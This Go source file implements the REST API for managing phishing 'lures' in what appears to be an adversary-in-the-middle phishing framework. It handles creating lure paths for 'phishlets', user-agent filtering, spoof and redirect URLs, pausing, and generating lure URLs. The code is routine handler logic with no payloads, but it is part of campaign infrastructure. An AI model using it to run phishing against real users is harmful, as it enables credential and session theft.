package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	phishlet := req.URL.Query().Get("phishlet")

	all, err := r.Lures.List()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to list lures")
		return
	}

	var filtered []*aitm.Lure
	for _, l := range all {
		if phishlet == "" || l.Phishlet == phishlet {
			filtered = append(filtered, l)
		}
	}

	total := len(filtered)
	start := min(offset, total)
	end := min(start+limit, total)
	page := filtered[start:end]

	items := make([]sdk.LureResponse, len(page))
	for i, lure := range page {
		items[i] = r.lureToResponse(lure)
	}

	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.LureResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
	body, ok := decodeAndValidate[sdk.CreateLureRequest](w, req)
	if !ok {
		return
	}

	phishlet, err := r.Phishlets.Get(body.Phishlet)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusBadRequest, "phishlet not found")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
		}

		return
	}

	if !phishlet.Enabled {
		writeError(w, http.StatusBadRequest, "phishlet is not enabled")
		return
	}

	path := body.Path
	if path == "" {
		path = randomPath()
	}

	lure := &aitm.Lure{
		Phishlet:    body.Phishlet,
		Hostname:    phishlet.Hostname,
		Path:        path,
		RedirectURL: body.RedirectURL,
		SpoofURL:    body.SpoofURL,
		UAFilter:    body.UAFilter,
	}

	if err := r.Lures.Create(lure); err != nil {
		if errors.Is(err, aitm.ErrConflict) {
			writeError(w, http.StatusConflict, "lure already exists")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to create lure")
		}

		return
	}

	writeJSON(w, http.StatusCreated, r.lureToResponse(lure))
}

func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	lure, err := r.Lures.Get(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "lure does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get lure")
		}

		return
	}

	body, ok := decodeAndValidate[sdk.UpdateLureRequest](w, req)
	if !ok {
		return
	}

	if body.UAFilter != nil {
		lure.UAFilter = *body.UAFilter
	}
	if body.RedirectURL != nil {
		lure.RedirectURL = *body.RedirectURL
	}
	if body.SpoofURL != nil {
		lure.SpoofURL = *body.SpoofURL
	}
	if err := r.Lures.Update(lure); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to update lure")
		return
	}

	writeJSON(w, http.StatusOK, r.lureToResponse(lure))
}

func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	if err := r.Lures.Delete(id); err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "lure does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to delete lure")
		}
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	lure, err := r.Lures.Get(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "lure does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to get lure")
		}

		return
	}

	var body sdk.GenerateURLRequest
	_ = json.NewDecoder(req.Body).Decode(&body) // body is optional

	url, err := r.Lures.URLWithParams(lure, r.HTTPSPort, body.Params)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to generate lure URL")
		return
	}

	writeJSON(w, http.StatusOK, sdk.GenerateURLResponse{URL: url})
}

func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	body, ok := decodeAndValidate[sdk.PauseLureRequest](w, req)
	if !ok {
		return
	}

	duration, err := time.ParseDuration(body.Duration)
	if err != nil {
		writeError(w, http.StatusUnprocessableEntity, "failed to parse duration")
		return
	}

	lure, err := r.Lures.Pause(id, duration)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "lure does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to pause lure")
		}
		return
	}

	writeJSON(w, http.StatusOK, r.lureToResponse(lure))
}

func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	lure, err := r.Lures.Unpause(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			writeError(w, http.StatusNotFound, "lure does not exist")
		} else {
			writeError(w, http.StatusInternalServerError, "failed to unpause lure")
		}
		return
	}

	writeJSON(w, http.StatusOK, r.lureToResponse(lure))
}

func (r *Router) lureToResponse(lure *aitm.Lure) sdk.LureResponse {
	return sdk.LureResponse{
		ID:          lure.ID,
		Phishlet:    lure.Phishlet,
		URL:         lure.URL(r.HTTPSPort),
		RedirectURL: lure.RedirectURL,
		SpoofURL:    lure.SpoofURL,
		UAFilter:    lure.UAFilter,
		PausedUntil: lure.PausedUntilPtr(),
	}
}

func randomPath() string {
	b := make([]byte, 6)
	rand.Read(b)
	return "/" + hex.EncodeToString(b)
}
